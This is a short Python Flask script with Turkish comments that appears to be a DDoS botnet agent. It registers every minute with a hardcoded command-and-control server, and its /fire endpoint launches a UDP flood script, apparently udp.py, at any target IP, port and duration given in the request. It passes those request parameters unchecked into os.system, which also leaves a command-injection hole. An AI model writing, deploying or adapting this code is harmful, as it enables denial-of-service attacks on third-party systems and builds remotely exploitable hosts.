import os, requests, threading, time
from flask import Flask, request

# --- AYARLAR ---
# Buraya her zaman ssh terminalindeki GÜNCEL linki yapıştır kanka
BEYIN_URL = "http://34.178.18.184:5000"

app = Flask(__name__)

@app.route('/fire')
def fire():
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    os.system(f"nohup python3 udp.py {target} {port} 3 {sure} > /dev/null 2>&1 &")
    return "OK", 200

def register():
    while True:
        try:
            requests.get(f"{BEYIN_URL}/kayit?port=8080", timeout=10)
        except:
            pass
        time.sleep(60)

if __name__ == '__main__':
    threading.Thread(target=register, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
